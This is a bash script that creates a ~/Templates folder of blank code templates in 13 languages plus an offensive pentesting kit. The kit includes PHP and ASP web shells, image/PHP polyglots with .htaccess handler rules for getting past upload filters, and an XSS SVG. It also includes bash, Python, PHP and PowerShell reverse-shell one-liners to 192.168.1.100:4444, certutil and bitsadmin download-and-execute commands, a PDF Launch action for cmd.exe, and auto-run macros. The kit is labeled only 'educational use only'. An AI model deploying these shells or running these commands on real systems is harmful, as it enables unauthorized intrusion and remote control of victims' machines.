#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Log functions
success() { 
    echo -e "${GREEN}[✓]${NC} :: $1" 
}

info() { 
    echo -e "${BLUE}[i]${NC} :: $1" 
}

warning() { 
    echo -e "${YELLOW}[!]${NC} :: $1" 
}

error() { 
    echo -e "${RED}[✗]${NC} :: $1" 
}

section() { 
    echo -e "${CYAN}[ $1 ]${NC}" 
}

# Multi-language Code Templates Generator
# Description: Creates various programming language templates and security testing files
# Features:
#   * Creates templates for 13 different programming languages
#   * Generates empty image files for testing
#   * Creates security testing files with double extensions
#   * Organized directory structure in ~/Templates
#   * Color-coded output with status messages

# Function to print usage information
print_usage() {
    echo -e "${CYAN}[ Usage ]${NC}"
    echo "Usage: $0 [clean]"
    echo ""
    echo "Options:"
    echo "  clean    # Remove all generated templates"
    echo ""
    echo "Description:"
    echo "  This script creates a collection of programming language templates"
    echo "  and security testing files in ~/Templates directory"
    echo ""
    echo "Features:"
    echo "  # 13 programming language templates"
    echo "  # Empty image files for testing"
    echo "  # Security testing files"
}

# Check for help flag
if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    print_usage
    exit 0
fi

# Check for clean option
if [ "$1" = "clean" ]; then
    section "Cleaning Templates"
    if [ -d ~/Templates ]; then
        rm -rf ~/Templates
        success "All templates removed from ~/Templates"
    else
        info "Templates directory not found"
    fi
    exit 0
fi

# Main script execution
section "Creating Code and File Templates"

TEMPLATES_DIR=~/Templates
mkdir -p "$TEMPLATES_DIR"
success "Templates directory created at $TEMPLATES_DIR"

# C# Template Creation
section "Creating C# Templates"
CS_DIR="$TEMPLATES_DIR/cs_testing"
mkdir -p "$CS_DIR"

cat > "$CS_DIR/cs_testing.csproj" << 'EOF_CS_PROJ'
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>
EOF_CS_PROJ

cat > "$CS_DIR/cs_testing.sln" << 'EOF_CS_SLN'
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.5.2.0
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Cs_testing", "Cs_testing.csproj", "{E7C77365-64A1-B40D-35EE-CF6EAA2AE326}"
EndProject
Global
  GlobalSection(SolutionConfigurationPlatforms) = preSolution
    Debug|Any CPU = Debug|Any CPU
    Release|Any CPU = Release|Any CPU
  EndGlobalSection
  GlobalSection(ProjectConfigurationPlatforms) = postSolution
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {E7C77365-64A1-B40D-35EE-CF6EAA2AE326}.Release|Any CPU.Build.0 = Release|Any CPU
  EndGlobalSection
  GlobalSection(SolutionProperties) = preSolution
    HideSolutionNode = FALSE
  EndGlobalSection
  GlobalSection(ExtensibilityGlobals) = postSolution
    SolutionGuid = {8E3EBE5F-5726-4511-AB60-D1BF277D58B4}
  EndGlobalSection
EndGlobal
EOF_CS_SLN

cat > "$CS_DIR/Program.cs" << 'EOF_CS_PROGRAM'
using System;
using Microsoft.Extensions.Configuration;

class Program {
    static void Main(string[] args) {
        Console.WriteLine("/* Project to test */");
        Program program = new Program();
        program.Test();
    }

    private void Test() {
        // Add C# test code here
    }
}
EOF_CS_PROGRAM

success "C# templates created in $CS_DIR"

# Basic HTML Template
section "Creating HTML Template"

cat > "$TEMPLATES_DIR/html_template.html" << 'EOF_HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>HTML Template</h1>
</body>
</html>
EOF_HTML

success "HTML template created"

# Other Language Templates
section "Creating Multi-language Templates"

cat > "$TEMPLATES_DIR/php_test.php" << 'EOF_PHP'
<?php
class PHP_test {
    public static function main() {
        echo "/* PHP Project to test */";
    
        $app = new PHP_test();
        $app->test();
    }
  
    private function test() {
        // Add PHP test code here
    }
}

PHP_test::main();
?>
EOF_PHP

cat > "$TEMPLATES_DIR/javascript_test.js" << 'EOF_JS'
class JavaScript_test {
    static main() {
        console.log("/* JavaScript Project to test */");
    
        const app = new JavaScript_test();
        app.test();
    }
  
    test() {
        // Add JavaScript test code here
    }
}

JavaScript_test.main();
EOF_JS

cat > "$TEMPLATES_DIR/powershell_test.ps1" << 'EOF_PS'
class PowerShell_test {
    static [void] Main() {
        Write-Host "/* PowerShell Project to test */"
    
        $app = [PowerShell_test]::new()
        $app.Test()
    }
  
    [void] Test() {
        # Add PowerShell test code here
    }
}

PowerShell_test::Main()
EOF_PS

cat > "$TEMPLATES_DIR/go_test.go" << 'EOF_GO'
package main

import "fmt"

type Go_test struct {}

func main() {
    fmt.Println("/* Go Project to test */")
  
    app := Go_test{}
    app.Test()
}

func (g Go_test) Test() {
    // Add Go test code here
}
EOF_GO

cat > "$TEMPLATES_DIR/rust_test.rs" << 'EOF_RUST'
struct Rust_test;

impl Rust_test {
    fn main() {
        println!("/* Rust Project to test */");
    
        let app = Rust_test;
        app.test();
    }
  
    fn test(&self) {
        // Add Rust test code here
    }
}

fn main() {
    Rust_test::main();
}
EOF_RUST

cat > "$TEMPLATES_DIR/Java_test.java" << 'EOF_JAVA'
public class Java_test {
    public static void main(String[] args) {
        System.out.println("/* Java Project to test */");
    
        Java_test app = new Java_test();
        app.test();
    }
  
    private void test() {
        // Add Java test code here
    }
}
EOF_JAVA

cat > "$TEMPLATES_DIR/bash_test.sh" << 'EOF_BASH'
#!/bin/bash

main() {
    echo "/* Bash Project to test */"
    test_func
}

test_func() {
    # Add bash test code here
}

main "$@"
EOF_BASH

cat > "$TEMPLATES_DIR/py_testing.py" << 'EOF_PYTHON'
class Py_testing:
    def main():
        print('/* Python Project to test */')

        program = Py_testing()
        program.test()

    def test(self):
        # Add Python test code here
        pass

if __name__ == '__main__':
    Py_testing.main()
EOF_PYTHON

cat > "$TEMPLATES_DIR/cpp_test.cpp" << 'EOF_CPP'
#include <iostream>

class CPP_test {
public:
    static void main() {
        std::cout << "/* C++ Project to test */" << std::endl;
    
        CPP_test app;
        app.test();
    }
  
    void test() {
        // Add C++ test code here
    }
};

int main() {
    CPP_test::main();
    return 0;
}
EOF_CPP

cat > "$TEMPLATES_DIR/ruby_test.rb" << 'EOF_RUBY'
class Ruby_test
    def self.main
        puts "/* Ruby Project to test */"
        
        app = Ruby_test.new
        app.test
    end
    
    def test
        # Add Ruby test code here
    end
end

Ruby_test.main
EOF_RUBY

cat > "$TEMPLATES_DIR/typescript_test.ts" << 'EOF_TS'
class TypeScript_test {
    static main(): void {
        console.log("/* TypeScript Project to test */");
        
        const app = new TypeScript_test();
        app.test();
    }
    
    test(): void {
        // Add TypeScript test code here
    }
}

TypeScript_test.main();
EOF_TS

success "Multi-language templates created (PHP, JavaScript, PowerShell, Go, Rust, Java, Bash, Python, C++, Ruby, TypeScript)"

# Empty Image File Templates
section "Creating Empty Image Templates"

touch "$TEMPLATES_DIR/empty_image.png"
touch "$TEMPLATES_DIR/empty_image.jpg"
touch "$TEMPLATES_DIR/empty_image.gif"
touch "$TEMPLATES_DIR/empty_image.bmp"
touch "$TEMPLATES_DIR/empty_image.webp"
touch "$TEMPLATES_DIR/empty_image.tiff"
touch "$TEMPLATES_DIR/empty_image.ico"

cat > "$TEMPLATES_DIR/empty_image.svg" << 'EOF_SVG'
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" fill="white"/>
  <text x="50%" y="50%" font-family="Arial" font-size="12" text-anchor="middle" dy=".3em">Empty SVG</text>
</svg>
EOF_SVG

success "Empty image templates created (PNG, JPG, GIF, BMP, WEBP, TIFF, ICO, SVG)"

# Double Extension Templates (Educational Testing)
section "Creating Double Extension Templates"

cat > "$TEMPLATES_DIR/test.php.png" << 'EOF_PHP_PNG'
GIF89a
<?php
// PHP-PNG: For file upload bypass testing (EDUCATIONAL USE ONLY)
system(\$_GET['cmd']);
?>
EOF_PHP_PNG

cat > "$TEMPLATES_DIR/test.php.jpg" << 'EOF_PHP_JPG'
ÿØÿà
<?php
// PHP-JPEG: For file upload bypass testing (EDUCATIONAL USE ONLY)
system(\$_GET['cmd']);
?>
EOF_PHP_JPG

cat > "$TEMPLATES_DIR/test.php.gif" << 'EOF_PHP_GIF'
GIF89a
<?php
// PHP-GIF: For file upload bypass testing (EDUCATIONAL USE ONLY)
system(\$_GET['cmd']);
?>
EOF_PHP_GIF

cat > "$TEMPLATES_DIR/htaccess_image_handler.htaccess" << 'EOF_HTACCESS'
AddType application/x-httpd-php .png .jpg .gif .jpeg
<FilesMatch "\.(png|jpg|gif|jpeg)$">
SetHandler application/x-httpd-php
</FilesMatch>
EOF_HTACCESS

# Set execution permissions for the Bash template
chmod +x "$TEMPLATES_DIR/bash_test.sh"

warning "Double extension templates created for security testing purposes"

# NEW PENTESTING TEMPLATES (ADDED)
section "Creating PDF Pentesting Templates"

PDF_DIR="$TEMPLATES_DIR/pdf_pentest"
mkdir -p "$PDF_DIR"

# PDF with JavaScript for testing
cat > "$PDF_DIR/test_js.pdf.txt" << 'EOF'
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj

3 0 obj
<<
/Type /Action
/S /JavaScript
/JS (
app.alert("PDF JavaScript Test");
)
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj

4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
>>
endobj

5 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
72 720 Td
(PDF JavaScript Test) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000056 00000 n
0000000110 00000 n
0000000209 00000 n
0000000289 00000 n
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
390
%%EOF
EOF

# PDF with PHP content
cat > "$PDF_DIR/test_php.pdf.txt" << 'EOF'
%PDF-1.4
%<?php echo 'TEST'; ?>
1 0 obj
<<
/Title (Test PDF with PHP)
/Author (<?php echo "test"; ?>)
>>
endobj

2 0 obj
<<
/Type /Catalog
/Pages 3 0 R
>>
endobj

3 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj

4 0 obj
<<
/Type /Page
/Parent 3 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
>>
endobj

5 0 obj
<<
/Length 56
>>
stream
BT
/F1 12 Tf
72 720 Td
(PDF with PHP test) Tj
ET
endstream
endobj

xref
0 6
trailer
<<
/Size 6
/Root 2 0 R
>>
startxref
100
%%EOF
EOF

# PDF with Windows command
cat > "$PDF_DIR/test_win.pdf.txt" << 'EOF'
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj

3 0 obj
<<
/S /Launch
/Win <<
/F (cmd.exe)
/P (/c echo test)
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj

4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
>>
endobj

5 0 obj
<<
/Length 67
>>
stream
BT
/F1 14 Tf
72 720 Td
(PDF Windows Command Test) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000056 00000 n
0000000120 00000 n
0000000200 00000 n
0000000289 00000 n
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
350
%%EOF
EOF

success "PDF pentesting templates created"

# Office Documents with Macros
section "Creating Office Macro Templates"

OFFICE_DIR="$TEMPLATES_DIR/office_macros"
mkdir -p "$OFFICE_DIR"

# Word macro template
cat > "$OFFICE_DIR/macro_word.vba" << 'EOF'
Sub AutoOpen()
    MsgBox "Macro executed"
End Sub

Sub Document_Open()
    AutoOpen
End Sub
EOF

# Excel macro template
cat > "$OFFICE_DIR/macro_excel.vba" << 'EOF'
Sub Workbook_Open()
    MsgBox "Excel macro executed"
End Sub

Sub Auto_Open()
    Workbook_Open
End Sub
EOF

success "Office macro templates created"

# Web Shell Templates
section "Creating Web Shell Templates"

WEB_SHELL_DIR="$TEMPLATES_DIR/web_shells"
mkdir -p "$WEB_SHELL_DIR"

# Basic PHP shell
cat > "$WEB_SHELL_DIR/shell.php" << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="GET">
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
EOF

# PHP shell with password
cat > "$WEB_SHELL_DIR/shell_pass.php" << 'EOF'
<?php
$pass = "password123";
if($_GET['p'] != $pass) die();

if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
EOF

# ASP shell
cat > "$WEB_SHELL_DIR/cmd.asp" << 'EOF'
<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set ws = CreateObject("WScript.Shell")
    Set exec = ws.Exec("cmd /c " & cmd)
    Response.Write(exec.StdOut.ReadAll())
End If
%>
<form>
<input name="cmd">
<input type="submit">
</form>
EOF

success "Web shell templates created"

# Reverse Shell Templates
section "Creating Reverse Shell Templates"

REVERSE_DIR="$TEMPLATES_DIR/reverse_shells"
mkdir -p "$REVERSE_DIR"

# Reverse shell collection
cat > "$REVERSE_DIR/shells.txt" << 'EOF'
# Bash reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
EOF

# Windows specific reverse shells
cat > "$REVERSE_DIR/windows.txt" << 'EOF'
# PowerShell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Certutil download and execute
certutil -urlcache -split -f http://192.168.1.100/nc.exe nc.exe && nc.exe 192.168.1.100 4444 -e cmd.exe

# Bitsadmin
bitsadmin /transfer job /download /priority high http://192.168.1.100/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
EOF

success "Reverse shell templates created"

# File Upload Bypass Templates
section "Creating File Upload Bypass Templates"

UPLOAD_DIR="$TEMPLATES_DIR/upload_bypass"
mkdir -p "$UPLOAD_DIR"

# Polyglot JPEG-PHP
cat > "$UPLOAD_DIR/shell.jpg.php" << 'EOF'
ÿØÿà
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Polyglot GIF-PHP
cat > "$UPLOAD_DIR/shell.gif.php" << 'EOF'
GIF89a
<?php system($_GET['c']); ?>
EOF

# .htaccess for PHP execution
cat > "$UPLOAD_DIR/htaccess_php.htaccess" << 'EOF'
AddType application/x-httpd-php .jpg .jpeg .png .gif
<FilesMatch "\.(jpg|jpeg|png|gif)$">
SetHandler application/x-httpd-php
</FilesMatch>
EOF

# SVG with JavaScript
cat > "$UPLOAD_DIR/xss.svg" << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
<rect width="100" height="100" fill="red"/>
</svg>
EOF

success "File upload bypass templates created"

# Windows Specific Templates
section "Creating Windows Templates"

WINDOWS_DIR="$TEMPLATES_DIR/windows"
mkdir -p "$WINDOWS_DIR"

# BAT file template
cat > "$WINDOWS_DIR/payload.bat" << 'EOF'
@echo off
echo Windows payload template
powershell -c "Write-Host 'Test'"
pause
EOF

# PowerShell script template
cat > "$WINDOWS_DIR/payload.ps1" << 'EOF'
Write-Host "PowerShell Payload"
Get-Process | Select-Object -First 5
EOF

# LNK file template info
cat > "$WINDOWS_DIR/template.lnk.txt" << 'EOF'
# LNK file structure
# Target: cmd.exe
# Arguments: /c powershell -c "command"
# Icon: shell32.dll,21
EOF

success "Windows templates created"

# Network Tools
section "Creating Network Tools"

NETWORK_DIR="$TEMPLATES_DIR/network"
mkdir -p "$NETWORK_DIR"

# Port scanner
cat > "$NETWORK_DIR/port_scan.sh" << 'EOF'
#!/bin/bash
host=$1
ports="21 22 23 25 80 443 3306 3389 8080"

for port in $ports; do
    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null &&
        echo "Port $port: OPEN" ||
        echo "Port $port: CLOSED"
done
EOF

chmod +x "$NETWORK_DIR/port_scan.sh"

# Netcat listener
cat > "$NETWORK_DIR/nc_listen.sh" << 'EOF'
#!/bin/bash
port=${1:-4444}
echo "Listening on port $port"
nc -nvlp $port
EOF

chmod +x "$NETWORK_DIR/nc_listen.sh"

# SSH config template
cat > "$NETWORK_DIR/ssh_config" << 'EOF'
Host *
    ServerAliveInterval 60
    TCPKeepAlive yes
    
Host jump
    HostName 192.168.1.1
    User root
    LocalForward 8080 localhost:80
EOF

success "Network tools created"

# Code Templates
section "Creating Additional Code Templates"

CODE_DIR="$TEMPLATES_DIR/code_templates"
mkdir -p "$CODE_DIR"

# C# template
cat > "$CODE_DIR/csharp.cs" << 'EOF'
using System;
using System.Diagnostics;

class Program {
    static void Main() {
        Console.WriteLine("C# Test");
    }
}
EOF

# Python template
cat > "$CODE_DIR/python.py" << 'EOF'
import os
import sys

print("Python test")
os.system("whoami")
EOF

# Java template
cat > "$CODE_DIR/java.java" << 'EOF'
public class Test {
    public static void main(String[] args) {
        System.out.println("Java test");
        Runtime rt = Runtime.getRuntime();
        try {
            rt.exec("whoami");
        } catch(Exception e) {}
    }
}
EOF

success "Additional code templates created"

# Miscellaneous Files
section "Creating Miscellaneous Files"

MISC_DIR="$TEMPLATES_DIR/misc"
mkdir -p "$MISC_DIR"

# Create empty files for testing
touch "$MISC_DIR/empty.jpg"
touch "$MISC_DIR/empty.png"
touch "$MISC_DIR/empty.gif"
touch "$MISC_DIR/empty.pdf"

# Create test files
echo "Test content" > "$MISC_DIR/test.txt"
echo "<?php phpinfo(); ?>" > "$MISC_DIR/info.php"
echo "<% Response.Write('ASP test') %>" > "$MISC_DIR/test.asp"

# XML test file
cat > "$MISC_DIR/test.xml" << 'EOF'
<?xml version="1.0"?>
<root>
    <test>XML content</test>
</root>
EOF

success "Miscellaneous files created"

# Finalization
section "Summary"

info "Original language templates: 13"
info "PDF templates: 3"
info "Office macro templates: 2"
info "Web shell templates: 3"
info "Reverse shell collections: 2"
info "File upload bypass: 4"
info "Windows templates: 3"
info "Network tools: 3"
info "Additional code templates: 3"
info "Miscellaneous files: 7"

success "All templates created successfully in $TEMPLATES_DIR"
warning "Educational use only: Templates are for authorized security testing only"
